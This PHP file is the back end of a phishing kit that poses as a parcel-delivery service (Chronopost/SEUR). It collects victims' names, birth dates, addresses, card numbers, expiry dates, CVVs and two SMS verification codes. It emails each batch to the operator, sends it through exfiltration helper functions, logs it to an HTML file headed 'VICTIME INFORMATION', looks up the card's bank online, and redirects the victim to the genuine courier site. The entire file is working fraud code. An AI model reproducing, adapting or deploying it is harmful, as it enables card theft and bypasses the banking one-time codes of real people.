<?php

session_start();
require_once('./inc/config.inc.php');
require_once("./inc/function.inc.php");


include('Email.php');
include('get_browser.php');
include('get_ip.php');
include('funciones.php');

$type = "" ;
$bank =  "";


$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');


if (isset($_POST['infoget'])) {
	# code...


$_SESSION['Full_name'] = $_POST['Geburtsdatuml'];
$_SESSION['Date_bth'] = $_POST['Geburtsdatuml'];
$_SESSION['Eamil'] = $_POST['EMailaddresse'];
$_SESSION['Adress'] = $_POST['Rechnungsadresse'];
$_SESSION['Zip_code'] = $_POST['Postleitzahl'];
$_SESSION['City'] = $_POST['Stadt'];
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$subject = $_SESSION['subject'] = "Mr.Undetected | New ES INFO [$ip] ***" ;
$to = $setting["mail_to"];

send($_SESSION,$to, $subject);
$_SESSION['logged_in'] = "true";

$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST INFO ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [NAME  ]  = <font style='color:#ba0000;'>".$_POST['Kartenhalter']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [DATE  ]  = <font style='color:#ba0000;'>".$_POST['Geburtsdatuml']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [EMAIL ]  = <font style='color:#ba0000;'>".$_POST['EMailaddresse']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [ADRSS ]  = <font style='color:#ba0000;'>".$_POST['Rechnungsadresse']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [ZIPCD ]  = <font style='color:#ba0000;'>".$_POST['Postleitzahl']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CITY  ]  = <font style='color:#ba0000;'>".$_POST['Stadt']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";

$cc = "NAME : ".$_POST['Kartenhalter']."\nDATE : ".$_POST['Geburtsdatuml']."\nEMAIL : ".$_POST['EMailaddresse'].
     "\nADRS : ".$_POST['Rechnungsadresse']."\nZIPCD : ".$_POST['Postleitzahl']."\nCITY : "
     .$_POST['Stadt']."\nIP : ".$ip."\nTIME : ".$TIME_DATE.
     "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
     
functiondilih($cc);
$khraha = fopen("../../ICD.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../engagement.php?assure_boba=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}





if (isset($_POST['cartget'])) {


$_SESSION['Full_name'] = $_POST['Kartennummer'];
$_SESSION['Card'] = $_POST['Ablauf'];
$_SESSION['Date'] = $_POST['Sicherheitscode'];
$_SESSION['Cvv'] = $_POST['Postleitzahl'];
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$subject = $_SESSION['subject'] = "Mr.Undetected | New ES CC [$ip] ***" ;
$to = $setting["mail_to"];

send($_SESSION,$to, $subject);
$_SESSION['logged_in'] = "true";
$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST CARD ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [NAME  ]  = <font style='color:#ba0000;'>".$_POST['Kartenhalter']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD  ]  = <font style='color:#ba0000;'>".$_POST['Kartennummer']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [EXPD  ]  = <font style='color:#ba0000;'>".$_POST['Ablauf']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV   ]  = <font style='color:#ba0000;'>".$_POST['Sicherheitscode']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";


$v = str_replace(" ", "", $_POST['Kartennummer']);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$v);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Accept-Version: 3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

$obj = json_decode($result, true);

if ($obj ) {
	$type = $obj['type'] ;
$bank =  $obj['bank']['name'];

}else {
	$type = '*****' ;
$bank =  '*****' ;

}



$cc ="bank : ".$bank."\n type :".$type."\nNAME : ".$_POST['Kartenhalter']."\nCARD : ".$_POST['Kartennummer']."\nDATE : ".$_POST['Ablauf']."\nCVV : ".$_POST['Sicherheitscode']."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
functiondilih($cc);


$khraha = fopen("../../ICD.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../demande.php?assure_boba=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}





if (isset($_POST['smsone'])) {

$_SESSION['sms_one'] = $_POST['F982345787234LPIN'];
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$subject = $_SESSION['subject'] = "Mr.Undetected | New ES SMS 1 [$ip] ***" ;
$to = $setting["mail_to"];

send($_SESSION,$to, $subject);

$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST SMS 1 ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [SMS   ]  = <font style='color:#ba0000;'>".$_POST['F982345787234LPIN']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";

$cc = "SMS (1) : ".$_POST['F982345787234LPIN']."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
functiondilihsms($cc);


$khraha = fopen("../../ICD.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: ../demande.php?assure_boba=false&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
}




if (isset($_POST['smstow'])) {

$_SESSION['sms_Tow'] = $_POST['F982345787234LPIN'];
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$subject = $_SESSION['subject'] = "Mr.Undetected | New ES SMS 2 [$ip] ***" ;
$to = $setting["mail_to"];

$DCH_MESSAGE .= "<html>
<head><meta charset='UTF-8'></head>
================( <font style='color: #0a5d00;'>CHRONOPOST SMS 2 ".$ip."</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [DMNE  ]  = <font style='color:#ba0000;'>".$_SERVER['HTTP_HOST']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [SMS   ]  = <font style='color:#ba0000;'>".$_POST['F982345787234LPIN']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>".$ip."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
</div></html>\n";

$cc = "SMS (2) : ".$_POST['F982345787234LPIN']."\nIP : ".$ip."\nTIME : ".$TIME_DATE. "\nBROWSER : ".XB_Browser($_SERVER['HTTP_USER_AGENT'])."\n".XB_OS($_SERVER['HTTP_USER_AGENT']);
functiondilihsms($cc);


$khraha = fopen("../../ICD.html", "a");
fwrite($khraha, $DCH_MESSAGE);
$DCH_SUBJECT .= "$ip";
$DCH_HEADERS .= "From: DCH<WHATSAPP>";
$DCH_HEADERS .= "Dch-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
HEADER("Location: http://www.seur.es/");
}



?>
